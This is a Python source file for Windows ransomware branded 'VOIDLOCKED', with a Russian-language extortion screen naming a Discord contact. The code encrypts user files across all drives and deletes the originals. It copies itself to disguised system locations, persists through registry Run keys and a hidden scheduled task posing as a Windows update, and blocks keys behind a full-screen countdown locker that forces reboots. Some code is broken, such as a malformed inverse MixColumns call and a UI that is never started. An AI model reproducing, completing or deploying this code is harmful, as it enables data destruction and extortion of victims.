import os
import sys
import time
import ctypes
import random
import shutil
import struct
import getpass
import subprocess
import threading
import hashlib
import base64
import socket
import uuid
import string
import tkinter as tk
from tkinter import font as tkfont
from pathlib import Path
from datetime import datetime, timedelta
import winreg

UNLOCK_CODE = "2099209920993000"
TIMER_HOURS = 2
WRONG_PENALTY_HOURS = 1
DISCORD_CONTACT = "akronov"
VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
REGISTRY_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_VALUE = "VoidSystemCore"

TARGET_EXTENSIONS = [
    '.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.txt','.rtf',
    '.jpg','.jpeg','.png','.bmp','.gif','.tiff','.raw','.psd',
    '.mp3','.mp4','.avi','.mkv','.wmv','.mov','.flv',
    '.zip','.rar','.7z','.tar','.gz','.iso',
    '.py','.js','.html','.css','.php','.sql','.db',
    '.pst','.ost','.msg','.eml',
    '.key','.crt','.pem',
    '.vhd','.vhdx','.vmdk',
    '.bak','.old','.backup',
    '.cfg','.config','.ini',
    '.xlsx','.xlsm','.xlsb',
    '.accdb','.mdb',
    '.dwg','.dxf',
    '.cpp','.c','.h','.java','.cs',
    '.vmx','.vmsn','.vmem',
]

ENCRYPTED_EXT = ".VOIDLOCKED"

class AES_CTR:
    sbox = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ]

    inv_sbox = [
        0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
        0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
        0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
        0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
        0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
        0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
        0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
        0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
        0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
        0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
        0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
        0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
        0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
        0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
        0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
        0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
    ]

    rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]

    @staticmethod
    def sub_word(word):
        return ((AES_CTR.sbox[(word >> 24) & 0xff] << 24) |
                (AES_CTR.sbox[(word >> 16) & 0xff] << 16) |
                (AES_CTR.sbox[(word >> 8) & 0xff] << 8) |
                (AES_CTR.sbox[word & 0xff]))

    @staticmethod
    def rot_word(word):
        return ((word << 8) | (word >> 24)) & 0xffffffff

    @staticmethod
    def key_expansion(key):
        kb = list(key)[:32]
        while len(kb) < 32:
            kb = (kb * 32)[:32]
        nk, nr = 8, 14
        w = []
        for i in range(nk):
            w.append((kb[4*i] << 24) | (kb[4*i+1] << 16) | (kb[4*i+2] << 8) | kb[4*i+3])
        for i in range(nk, 4 * (nr + 1)):
            temp = w[i-1]
            if i % nk == 0:
                temp = AES_CTR.sub_word(AES_CTR.rot_word(temp)) ^ (AES_CTR.rcon[i // nk - 1] << 24)
            elif i % nk == 4:
                temp = AES_CTR.sub_word(temp)
            w.append(w[i - nk] ^ temp)
        rk = []
        for r in range(nr + 1):
            rr = []
            for j in range(4):
                x = w[r * 4 + j]
                rr.extend([(x >> 24) & 0xff, (x >> 16) & 0xff, (x >> 8) & 0xff, x & 0xff])
            rk.append(rr)
        return rk

    @staticmethod
    def add_round_key(s, rk):
        for i in range(16): s[i] ^= rk[i]

    @staticmethod
    def sub_bytes(s):
        for i in range(16): s[i] = AES_CTR.sbox[s[i]]

    @staticmethod
    def inv_sub_bytes(s):
        for i in range(16): s[i] = AES_CTR.inv_sbox[s[i]]

    @staticmethod
    def shift_rows(s):
        s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
        s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
        s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]

    @staticmethod
    def inv_shift_rows(s):
        s[1], s[5], s[9], s[13] = s[13], s[1], s[5], s[9]
        s[2], s[6], s[10], s[14] = s[14], s[2], s[6], s[10]
        s[3], s[7], s[11], s[15] = s[7], s[15], s[3], s[11]

    @staticmethod
    def gm(a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            hi = a & 0x80
            a = (a << 1) & 0xff
            if hi: a ^= 0x1b
            b >>= 1
        return p

    @staticmethod
    def mix_columns(s):
        for i in range(4):
            c = i * 4
            a = s[c:c+4]
            s[c]   = AES_CTR.gm(2, a[0]) ^ AES_CTR.gm(3, a[1]) ^ a[2] ^ a[3]
            s[c+1] = a[0] ^ AES_CTR.gm(2, a[1]) ^ AES_CTR.gm(3, a[2]) ^ a[3]
            s[c+2] = a[0] ^ a[1] ^ AES_CTR.gm(2, a[2]) ^ AES_CTR.gm(3, a[3])
            s[c+3] = AES_CTR.gm(3, a[0]) ^ a[1] ^ a[2] ^ AES_CTR.gm(2, a[3])

    @staticmethod
    def inv_mix_columns(s):
        for i in range(4):
            c = i * 4
            a = s[c:c+4]
            s[c]   = AES_CTR.gm(14, a[0]) ^ AES_CTR.gm(11, a[1]) ^ AES_CTR.gm(13,)
            s[c+1] = AES_CTR.gm(9, a[0]) ^ AES_CTR.gm(14, a[1]) ^ AES_CTR.gm(11, a[2]) ^ AES_CTR.gm(13, a[3])
            s[c+2] = AES_CTR.gm(13, a[0]) ^ AES_CTR.gm(9, a[1]) ^ AES_CTR.gm(14, a[2]) ^ AES_CTR.gm(11, a[3])
            s[c+3] = AES_CTR.gm(11, a[0]) ^ AES_CTR.gm(13, a[1]) ^ AES_CTR.gm(9, a[2]) ^ AES_CTR.gm(14, a[3])

    @staticmethod
    def encrypt_block(block, rk):
        s = list(block)
        AES_CTR.add_round_key(s, rk[0])
        for r in range(1, 14):
            AES_CTR.sub_bytes(s)
            AES_CTR.shift_rows(s)
            AES_CTR.mix_columns(s)
            AES_CTR.add_round_key(s, rk[r])
        AES_CTR.sub_bytes(s)
        AES_CTR.shift_rows(s)
        AES_CTR.add_round_key(s, rk[14])
        return bytes(s)

    @staticmethod
    def ctr_encrypt(data, key, nonce):
        rk = AES_CTR.key_expansion(key)
        res = bytearray()
        for off in range(0, len(data), 16):
            chunk = data[off:off+16]
            cb = nonce + struct.pack('>Q', off // 16)
            enc = AES_CTR.encrypt_block(cb, rk)
            for i in range(len(chunk)):
                res.append(chunk[i] ^ enc[i])
        return bytes(res)

def get_key():
    sid = f"{uuid.UUID(int=uuid.getnode())}-{os.environ.get('COMPUTERNAME','PC')}"
    return hashlib.sha256(sid.encode()).digest()

def get_drives():
    return [f"{l}:\\" for l in string.ascii_uppercase if os.path.exists(f"{l}:\\")]

def should_encrypt(p):
    low = p.lower()
    skip = ['windows','system32','boot','$recycle','program files','programdata','appdata','temp','microsoft','msocache']
    if any(s in low for s in skip): return False
    if p.endswith(ENCRYPTED_EXT): return False
    return os.path.splitext(p)[1].lower() in TARGET_EXTENSIONS

def encrypt_all():
    key = get_key()
    nonce = os.urandom(8)

    try:
        with open(os.path.join(os.environ['TEMP'],'.void_nonce'),'wb') as f:
            f.write(nonce)
    except: pass
    count = 0
    for d in get_drives():
        for root, dirs, files in os.walk(d):
            if any(s in root.lower() for s in ['windows\\system32','windows\\winsxs']):
                continue
            for f in files:
                fp = os.path.join(root, f)
                if should_encrypt(fp) and os.path.isfile(fp):
                    try:
                        with open(fp,'rb') as fh: data = fh.read()
                        enc = AES_CTR.ctr_encrypt(data, key, nonce)
                        with open(fp+ENCRYPTED_EXT,'wb') as fh: fh.write(enc)
                        os.remove(fp)
                        count += 1
                    except: pass
    return count

def replicate():
    exe = sys.argv[0]
    locs = [
        os.path.join(os.environ['TEMP'],'svchost_update.exe'),
        os.path.join(os.environ['WINDIR'],'System32','tasks','runtime_broker.exe'),
        os.path.join(os.environ['WINDIR'],'SysWOW64','runtime_broker.exe'),
        os.path.join(os.environ['LOCALAPPDATA'],'Microsoft','WindowsApps','system_update.exe'),
        'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe',
        os.path.join(os.environ['WINDIR'],'security_update.exe'),
    ]
    for l in locs:
        try:
            os.makedirs(os.path.dirname(l), exist_ok=True)
            if not os.path.exists(l):
                shutil.copy2(exe, l)
                ctypes.windll.kernel32.SetFileAttributesW(l, 2)
        except: pass

def add_startup():
    exe = sys.argv[0]
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, REGISTRY_VALUE, 0, winreg.REG_SZ, exe)
    except: pass
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, REGISTRY_VALUE, 0, winreg.REG_SZ, exe)
    except: pass

    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Windows Critical Update</Description></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden><AllowStartOnDemand>true</AllowStartOnDemand><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  <AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable>
  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable></Settings>
  <Actions Context="Author"><Exec><Command>{exe}</Command></Exec></Actions>
</Task>'''
    try:
        tf = os.path.join(os.environ['TEMP'],'t.xml')
        with open(tf,'w',encoding='utf-16') as f: f.write(task_xml)
        subprocess.run(['schtasks','/create','/tn','MicrosoftWindowsCriticalUpdate','/xml',tf,'/f'],
                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        os.remove(tf)
    except: pass

def hide():
    try:
        ctypes.windll.kernel32.FreeConsole()
        ctypes.windll.kernel32.SetConsoleTitleW("svchost")
    except: pass

def bios_marker():
    try:
        subprocess.run(
            'powershell -Command "Add-Content -Path \'C:\\Windows\\System32\\drivers\\etc\\hosts\' -Value \'# VOID_BIOS\'"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5
        )
    except: pass

class LockerUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True, '-topmost', True)
        self.root.configure(bg='black')
        self.root.overrideredirect(True)
        self.end_time = datetime.now() + timedelta(hours=TIMER_HOURS)
        self.locked = True
        self.pw_var = tk.StringVar()
        self.big_f = tkfont.Font(family='Arial', size=72, weight='bold')
        self.med_f = tkfont.Font(family='Arial', size=28, weight='bold')
        self.sml_f = tkfont.Font(family='Arial', size=18)
        self.tmr_f = tkfont.Font(family='Courier New', size=48, weight='bold')

        self.root.bind('<KeyPress>', self.block_keys)
        self.root.bind('<KeyRelease>', self.block_keys)

        self.main = tk.Frame(self.root, bg='black')
        self.main.pack(fill='both', expand=True)

        self.scare = tk.Frame(self.main, bg='black')
        scare_txt = r"""
░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓██████████████▓▒░░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░   
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
                                                                                                                 
                                                                                                                 
        """
        tk.Label(self.scare, text=scare_txt, fg='red', bg='black',
                font=('Courier New',10,'bold'), justify='left').pack()
        tk.Label(self.scare, text="☠ ВАШ КОМПЬЮТЕР ЗАХВАЧЕН ☠",
                fg='red', bg='black', font=self.med_f).pack(pady=20)
        self.scare.place(relx=0.5, rely=0.5, anchor='center')

        self.lock = tk.Frame(self.main, bg='red3')
        tk.Label(self.lock, text="![⚠️](tg://emoji?id=6014565346827051474) ВНИМАНИЕ! ![⚠️](tg://emoji?id=6014565346827051474)", fg='white', bg='red3',
                font=self.big_f).pack(pady=(50,10))

        msg = ("ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ\n"
               "ДЛЯ РАЗБЛОКИРОВКИ НАПИШИТЕ В DISCORD:\n\n"
               f"            @{DISCORD_CONTACT}\n\n"
               f"ID ЖЕРТВЫ: {VICTIM_ID}\n\n"
               "НЕ ПЫТАЙТЕСЬ УДАЛИТЬ ПРОГРАММУ\n"
               "НЕ ПЕРЕЗАГРУЖАЙТЕ КОМПЬЮТЕР\n"
               "ЭТО ПРИВЕДЁТ К ПОТЕРЕ ДАННЫХ НАВСЕГДА!")
        tk.Label(self.lock, text=msg, fg='white', bg='red3',
                font=self.sml_f, justify='center').pack(pady=20)

        self.timer_lbl = tk.Label(self.lock, text="02:00:00", fg='yellow',
                                 bg='red3', font=self.tmr_f)
        self.timer_lbl.pack(pady=10)

        pw_f = tk.Frame(self.lock, bg='red3')
        pw_f.pack(pady=20)
        tk.Label(pw_f, text="ПАРОЛЬ РАЗБЛОКИРОВКИ:", fg='white', bg='red3',
                font=self.sml_f).pack()
        self.pw_entry = tk.Entry(pw_f, textvariable=self.pw_var, font=self.med_f,
                                width=30, show='●', bg='black', fg='lime',
                                insertbackground='lime')
        self.pw_entry.pack(pady=10)
        self.pw_entry.bind('<Return>', self.check)
        self.pw_entry.focus_set()

        tk.Button(pw_f, text="РАЗБЛОКИРОВАТЬ", font=self.sml_f,
                 bg='darkred', fg='white', command=self.check,
                 relief='raised', bd=3, width=25, height=2).pack(pady=10)

        self.status = tk.Label(self.lock, text="", fg='yellow', bg='red3', font=self.sml_f)
        self.status.pack(pady=10)

        tk.Label(self.lock, text=f"📧 Discord: {DISCORD_CONTACT}", fg='white',
                bg='red3', font=self.med_f).pack(pady=20)

        self.root.after(2000, self.show_locker)
        self.root.after(1000, self.tick)

    def block_keys(self, e):
        if e.keysym in ('Escape','F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12','Tab'):
            return 'break'
        if e.state & 0x0004: return 'break'
        if e.state & 0x0008: return 'break'

    def show_locker(self):
        self.scare.place_forget()
        self.lock.place(relx=0.5, rely=0.5, anchor='center')
        self.root.configure(bg='red3')

    def tick(self):
        if not self.locked: return
        rem = self.end_time - datetime.now()
        sec = int(rem.total_seconds())
        if sec <= 0:
            self.timer_lbl.config(text="00:00:00", fg='red')
            self.status.config(text="ВРЕМЯ ВЫШЛО! СБРОС", fg='red')
            self.root.update()
            self.root.after(2000, self.factory_reset)
            return
        h, m, s = sec // 3600, (sec % 3600) // 60, sec % 60
        self.timer_lbl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        if sec < 1800:
            self.timer_lbl.config(fg='red')
            self.root.configure(bg='darkred')
            self.lock.configure(bg='darkred')
        self.root.after(1000, self.tick)

    def check(self, e=None):
        if self.pw_var.get().strip() == UNLOCK_CODE:
            self.locked = False
            self.status.config(text="![✅](tg://emoji?id=6016835129668803369) ДОСТУП ВОССТАНОВЛЕН!", fg='lime')
            self.root.update()
            self.root.after(3000, self.unlock)
        else:
            self.end_time += timedelta(hours=WRONG_PENALTY_HOURS)
            self.status.config(text=f"❌ НЕВЕРНЫЙ ПАРОЛЬ! -{WRONG_PENALTY_HOURS} ЧАС", fg='red')
            self.pw_var.set("")

    def factory_reset(self):
        self.status.config(text="![⚠️](tg://emoji?id=6014565346827051474) СБРОС СИСТЕМЫ...", fg='red')
        self.root.update()

        subprocess.run('cmd.exe /c color 4c && echo СБРОС')
        self.status.config(text="⚠️ СБРОС СИСТЕМЫ...", fg='red')
        self.root.update()
        subprocess.run('cmd.exe /c color 4c && echo СБРОС СИСТЕМЫ... && timeout /t 5 && shutdown /p /f',
                      shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        subprocess.Popen(
            'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c echo СБРОС... && shutdown /r /f /t 0\'"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        threading.Thread(target=self.force_wipe, daemon=True).start()

    def force_wipe(self):
        cmds = [
            'shutdown /r /f /t 0',
            'powershell -Command "Restart-Computer -Force"',
            'wmic os where Primary=True call reboot',
            'shutdown /r /f /t 0 /o /boot'
        ]
        for c in cmds:
            try:
                subprocess.run(c, shell=True, capture_output=True,
                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
            except: pass
            time.sleep(0.3)

    def unlock(self):
       
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, REGISTRY_VALUE)
        except: pass
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, REGISTRY_VALUE)
        except: pass
        self.root.destroy()
        sys.exit(0)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":

    replicate()

    add_startup()

    hide()

    bios_marker()

    threading.Thread(target=encrypt_all, daemon=True).start()

    ui = LockerUI